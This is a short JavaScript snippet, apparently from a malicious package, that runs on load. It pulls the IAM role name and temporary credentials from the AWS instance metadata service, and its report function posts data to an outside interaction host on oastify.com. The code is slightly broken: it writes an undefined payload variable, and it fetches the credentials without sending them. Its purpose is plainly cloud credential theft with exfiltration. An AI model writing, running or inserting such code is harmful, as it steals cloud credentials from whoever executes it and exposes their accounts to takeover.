const OAST = 'cbrgum2pmg7tuobixmhfonfxyo4fscg1.oastify.com';
function report(tag, data) { const req = http.request({hostname: OAST, method: 'POST'}, (res) => {}); req.write(payload); req.end(); }
function checkMetadata() {
 const metadataUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
 const roleName = execSync(`curl -s -m 2 ${metadataUrl}`).toString().trim();
 const creds = execSync(`curl -s -m 2 ${metadataUrl}${roleName}`).toString();
 report('ROLE', { role: roleName });
}
checkMetadata();
